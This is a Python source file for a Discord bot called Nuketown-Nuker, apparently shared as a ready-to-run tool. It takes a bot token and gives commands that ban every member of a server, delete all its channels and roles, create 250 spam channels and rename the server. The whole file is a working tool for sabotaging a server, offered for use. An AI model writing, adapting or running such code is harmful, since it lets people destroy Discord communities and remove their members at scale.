print("Welcome to the official set-up guide to Nuketown-Nuker.\n")
import os
import random
from colorama import Fore
import discord
from discord.ext import commands

class NUKER():
  __version__ = 1

intents = discord.Intents.default()
intents.members = True

token = input ("Enter your bots token:\n")

print(f"\nBot token set to: {token}\n")

prefix = input("Enter your prefix:\n")

print(f"\nPrefix set to: {prefix}\n")

channels = input ("Enter the name of channels to be spammed:\n")

print(f"\nChannels set to {channels}\n")

bot = commands.Bot(command_prefix = prefix)
bot.remove_command("help")

def Clear():
    os.system('cls')

os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
    Clear()

    print(f'''{Fore.RED}
      ::::    ::: :::    ::: :::    ::: :::::::::: ::::::::::: ::::::::  :::       ::: ::::    ::: 
     :+:+:   :+: :+:    :+: :+:   :+:  :+:            :+:    :+:    :+: :+:       :+: :+:+:   :+:  
    :+:+:+  +:+ +:+    +:+ +:+  +:+   +:+            +:+    +:+    +:+ +:+       +:+ :+:+:+  +:+   
   +#+ +:+ +#+ +#+    +:+ +#++:++    +#++:++#       +#+    +#+    +:+ +#+  +:+  +#+ +#+ +:+ +#+    
  +#+  +#+#+# +#+    +#+ +#+  +#+   +#+            +#+    +#+    +#+ +#+ +#+#+ +#+ +#+  +#+#+#     
 #+#   #+#+# #+#    #+# #+#   #+#  #+#            #+#    #+#    #+#  #+#+# #+#+#  #+#   #+#+#      
###    ####  ########  ###    ### ##########     ###     ########    ###   ###   ###    ####      
 Nuketown Is Online <$
{Fore.RESET}
 - Run {prefix}help to see commands.
 - Github.com/TEERMIIINAAL                                   
 {Fore.RED}------------------------------------------------------------
    ''' + Fore.RESET)


#help commamd
@bot.command()
async def help(ctx):
        await ctx.message.delete()
        embed = discord.Embed(color=0xff2b41, timestamp=ctx.message.created_at)
        embed.set_author(name="Nuketown")
        embed.add_field(name=" :comet: `HELP`", value="- shows this message")
        embed.add_field(name=" :comet: `NUKE`", value="- destroys the server")
        embed.add_field(name=" :comet: `DCHANNELS`", value="- deletes all channels")
        embed.add_field(name=" :comet: `SCHANNELS`", value="- spams channels")
        embed.add_field(name=" :comet: `SNAME {MSG}`", value="- changes the server name")
        embed.set_footer(text="")
        embed.set_image(url="https://cdn.discordapp.com/attachments/772834827115167804/778657485917388809/tumblr_oi5rpmTpmV1u6hk5ko1_400.gif")
        await ctx.send(embed=embed)
         
#NUKE COMMAND
@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

#banning
    print("- Banning members")

    for member in list(ctx.message.guild.members):
       try:
           await guild.ban(member)
       except:
           pass

#deleting channels
    print("- Deleting channels")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
    except:
      pass
    
#creating channels

    print("- Spamming Channels")

    try:
      for i in range(250):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
    except:
      pass

        
#deleting roles
    
    print("- Deleting roles\n\n [SUCCESFULL] - Server has been nuked \n Thanks for using Nuketown")

    for role in guild.roles:
      try:
        await role.delete()
      except:
        pass
            
#server-name cmd
@bot.command(pass_context=True)
async def sname(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

#channel commands
@bot.command()
async def dchannels(ctx):
  await ctx.message.delete()
  await ctx.send(" :comet: `Deleting channels...`")
  for channel in ctx.guild.channels:
      await channel.delete()

@bot.command()
async def schannels(ctx):
  await ctx.message.delete()
  await ctx.send(" :comet: `Spamming channels...`")
  try:
      for i in range(250):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
  except:
      pass
      
bot.run(token)
